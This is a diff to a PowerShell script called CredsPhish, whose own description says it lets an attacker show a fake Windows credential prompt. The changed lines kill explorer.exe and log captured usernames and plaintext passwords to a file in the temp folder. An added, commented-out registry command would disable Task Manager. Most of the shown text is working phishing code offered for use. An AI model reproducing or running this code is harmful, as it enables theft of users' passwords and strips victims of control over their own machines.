@@ -2,9 +2,9 @@
 .SYNOPSIS
   Standalone Powershell script that will promp the current user for a valid credential.
 
-.Author: @enigma0x3 &('r00t-3xp10it')
-   Required Dependencies: None
-   Optional Dependencies: None
+.Author: enigma0x3 &('r00t-3xp10it')
+  Required Dependencies: None
+  Optional Dependencies: None
 
 .DESCRIPTION
    CredsPhish allows an attacker to craft a credentials prompt using Windows PromptForCredential,
@@ -23,9 +23,9 @@
 #>
 
 
-taskkill /f /im explorer.exe
-$timestamp = $null
 $account = $null
+$timestamp = $null
+Stop-Process -Name "explorer" -Force
 
 
 [int]$counter = 1
@@ -57,6 +57,7 @@ while ($counter -lt '1000000000')
       echo "   TimeStamp : $timestamp" >> $env:tmp\CredsPhish.log
       echo "   username  : $user" >> $env:tmp\CredsPhish.log
       echo "   password  : $pass" >> $env:tmp\CredsPhish.log
+      # cmd /c REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableTaskMgr /t REG_DWORD /d 1 /f
       Start-Process -FilePath $env:windir\explorer.exe
       exit
     }
